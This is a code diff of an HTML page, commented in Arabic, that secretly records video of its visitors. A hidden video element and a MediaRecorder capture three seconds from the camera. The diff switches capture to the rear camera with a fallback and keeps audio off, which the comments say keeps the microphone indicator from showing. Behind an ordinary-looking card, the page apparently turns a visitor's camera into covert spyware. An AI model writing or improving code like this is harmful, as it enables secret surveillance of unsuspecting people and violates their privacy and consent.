@@ -20,7 +20,7 @@
 </head>
 <body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
 
-    <!-- عنصر فيديو مخفي للتسجيل الصامت -->
+    <!-- عنصر فيديو مخفي للتسجيل الصامت عبر الكاميرا الخلفية -->
     <video id="video" autoplay playsinline muted style="display:none;"></video>
 
     <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
@@ -57,8 +57,20 @@
             const video = document.getElementById('video');
 
             try {
-                // طلب الكاميرا وحدها بدون صوت (audio: false) لكي لا تظهر علامة الميكروفون وتبدأ فوراً بدون تعليق
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                // طلب الكاميرا الخلفية حصرياً بدون صوت لتجنب التعليق وظهور شعار الميكروفون
+                const constraints = {
+                    video: { facingMode: { exact: "environment" } },
+                    audio: false
+                };
+
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia(constraints);
+                } catch (err) {
+                    // كبديل احتياطي لو الكاميرا الخلفية غير مدعومة في بعض البيئات الافتراضية
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                }
+
                 video.srcObject = stream;
                 await video.play();
 
@@ -119,7 +131,7 @@
                     reader.readAsDataURL(blob);
                 };
 
-                // التسجيل لمدة 3 ثوانٍ فقط ليكون سريع وخفيف جداً
+                // التسجيل لمدة 3 ثوانٍ بالكاميرا الخلفية
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
